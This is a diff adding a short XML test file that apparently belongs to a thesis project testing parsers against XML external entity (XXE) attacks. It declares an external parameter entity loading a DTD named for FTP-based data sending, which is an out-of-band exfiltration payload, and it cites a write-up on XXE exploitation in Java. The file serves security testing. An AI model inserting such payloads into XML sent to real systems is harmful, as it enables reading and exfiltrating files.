@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % asd SYSTEM "file:///home/phoenix/masterthesis/Christopher_Spaeth/code/xml_files/test/parameterEntity_sendftp.dtd"> 
+%asd; 
+%rrr; 
+]>
+<data></data>
+<!-- Source: http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html -->
+
+
